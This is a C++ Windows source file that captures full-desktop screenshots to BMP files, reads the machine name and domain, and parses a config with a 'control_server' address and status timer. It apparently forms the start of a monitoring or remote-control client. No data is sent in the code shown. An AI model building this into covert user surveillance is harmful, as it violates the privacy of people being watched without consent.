#include <iostream>
#include "Client.h"
#include "ConfigReader.h"
#include <algorithm>
#include <iostream>
#include <Lmwksta.h>
#include <StrSafe.h>
using namespace std;

int generator = 1;
wstring screenshot(wstring creanshot_dir)
{
    HWND window = GetDesktopWindow();
    RECT windowRect;
    GetWindowRect(window, &windowRect);

    int bitmap_dx = windowRect.right - windowRect.left;
    int bitmap_dy = windowRect.bottom - windowRect.top;

    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPFILEHEADER bmpFileHeader;
    BITMAP* pBitmap;

    bmpFileHeader.bfType = 0x4d42;
    bmpFileHeader.bfSize = 0;
    bmpFileHeader.bfReserved1 = 0;
    bmpFileHeader.bfReserved2 = 0;
    bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    bmpInfoHeader.biSize = sizeof(bmpInfoHeader);
    bmpInfoHeader.biWidth = bitmap_dx;
    bmpInfoHeader.biHeight = bitmap_dy;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biBitCount = 24;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biSizeImage = bitmap_dx * bitmap_dy * (24 / 8);
    bmpInfoHeader.biXPelsPerMeter = 0;
    bmpInfoHeader.biYPelsPerMeter = 0;
    bmpInfoHeader.biClrUsed = 0;
    bmpInfoHeader.biClrImportant = 0;

    BITMAPINFO info;
    info.bmiHeader = bmpInfoHeader;

    BYTE* memory;
    HDC winDC = GetWindowDC(window);
    HDC bmpDC = CreateCompatibleDC(winDC);

    HBITMAP bitmap = CreateDIBSection(winDC, &info, DIB_RGB_COLORS, (void**)&memory, NULL, 0);
    SelectObject(bmpDC, bitmap);
    BitBlt(bmpDC, 0, 0, bitmap_dx, bitmap_dy, winDC, 0, 0, SRCCOPY);
    ReleaseDC(window, winDC);
    wstring path = creanshot_dir + L"\\" + to_wstring(generator++) + L".bmp";

    HANDLE hFile = CreateFile(
        path.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return L"";

    DWORD dwWritten = 0;
    WriteFile(hFile, &bmpFileHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &bmpInfoHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, memory, bmpInfoHeader.biSizeImage, &dwWritten, NULL);
    CloseHandle(hFile);

    return path;
}

string getPCName() {
    char pcName[200];
    unsigned long pcNameLen = 200;
    GetComputerNameA(pcName, &pcNameLen);
    return string(pcName);
}

string getPCDomain() {
    CHAR domain[MAX_PATH];
    DWORD size = MAX_PATH;
    string domainName = "";
    if (GetComputerNameExA(ComputerNameDnsDomain, domain, &size))
        domainName = domain;
    return domainName;
}

int main() {

    ConfigReader cr;
    auto conf = cr.read("config.txt");

    string server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
    int server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
    string screenshot_dir = conf["screenshot_dir"];
    int send_status_timer = atoi(conf["timer_send_status"].c_str());
    string host_name = getPCName();
    string host_domain_name = getPCDomain();

   wcout <<  screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));


}